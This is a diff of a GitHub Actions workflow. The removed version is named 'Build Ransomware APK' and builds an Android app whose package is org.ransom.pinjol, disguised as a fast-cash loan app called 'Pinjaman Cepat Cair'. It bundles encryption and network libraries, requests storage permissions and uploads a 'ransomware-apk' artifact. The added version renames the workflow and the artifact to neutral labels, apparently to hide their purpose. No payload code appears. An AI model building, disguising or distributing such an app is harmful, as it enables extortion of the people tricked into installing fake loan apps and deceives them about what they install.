@@ -1,4 +1,4 @@
-name: Build Ransomware APK (FINAL)
+name: Build APK (SIMPLE)
 
 on:
   push:
@@ -9,103 +9,21 @@ jobs:
   build:
     runs-on: ubuntu-22.04
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.9'
-
-      - name: Set up Java 17
-        uses: actions/setup-java@v4
-        with:
-          distribution: 'temurin'
-          java-version: '17'
-
-      - name: Install system dependencies
+      - uses: actions/checkout@v4
+      
+      - name: Install Buildozer
         run: |
-          sudo apt-get update
-          sudo apt-get install -y \
-            python3-pip \
-            git \
-            zip \
-            unzip \
-            wget \
-            autoconf \
-            libtool \
-            pkg-config \
-            cmake \
-            libffi-dev \
-            libssl-dev \
-            build-essential
-
-      - name: Install Python dependencies (kecuali PyJNIus)
+          sudo apt update
+          sudo apt install -y python3-pip python3-venv git zip unzip openjdk-17-jdk
+          pip install --user buildozer cython virtualenv
+          echo "$HOME/.local/bin" >> $GITHUB_PATH
+      
+      - name: Build with Buildozer
         run: |
-          pip install --upgrade pip
-          pip install cython virtualenv
-          pip install python-for-android==2024.1.21
-          pip install pycryptodome requests kivy==2.3.1
-
-      - name: 🔧 PATCH PYJNIUS (FIX 'long' ERROR)
-        run: |
-          # Download PyJNIus source
-          git clone https://github.com/kivy/pyjnius.git
-          cd pyjnius
-          
-          # Fix the 'long' error in jnius_utils.pxi
-          sed -i 's/if isinstance(arg, long)/if isinstance(arg, int)/g' jnius/jnius_utils.pxi
-          sed -i 's/(isinstance(arg, long) and arg < 2147483648)/(isinstance(arg, int) and arg < 2147483648)/g' jnius/jnius_utils.pxi
-          
-          # Install patched version
-          pip install .
-          cd ..
-
-      - name: Setup Android SDK
-        run: |
-          mkdir -p $HOME/android-sdk
-          cd $HOME/android-sdk
-          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
-          unzip -q commandlinetools-linux-11076708_latest.zip
-          mkdir -p cmdline-tools/latest
-          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
-          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
-          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
-
-      - name: Accept Android licenses
-        run: |
-          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true
-
-      - name: Install SDK components (NDK 25)
-        run: |
-          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"
-          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "ndk;25.2.9519653"
-          echo "ANDROID_NDK_HOME=$ANDROID_HOME/ndk/25.2.9519653" >> $GITHUB_ENV
-
-      - name: 🚀 BUILD APK (FINAL)
-        run: |
-          p4a apk \
-            --private . \
-            --package=org.ransom.pinjol \
-            --name="Pinjaman Cepat Cair" \
-            --version=1.0 \
-            --bootstrap=sdl2 \
-            --requirements=python3,kivy==2.3.1,requests,pycryptodome \
-            --permission INTERNET \
-            --permission READ_EXTERNAL_STORAGE \
-            --permission WRITE_EXTERNAL_STORAGE \
-            --arch=arm64-v8a \
-            --arch=armeabi-v7a \
-            --sdk_dir=$ANDROID_HOME \
-            --ndk_dir=$ANDROID_NDK_HOME \
-            --android_api=31 \
-            --minsdk=21 \
-            --release \
-            --verbose
-
-      - name: 📦 Upload APK
+          buildozer android debug
+      
+      - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: ransomware-apk
-          path: ./*.apk
-          if-no-files-found: error
+          name: apk-final
+          path: bin/*.apk
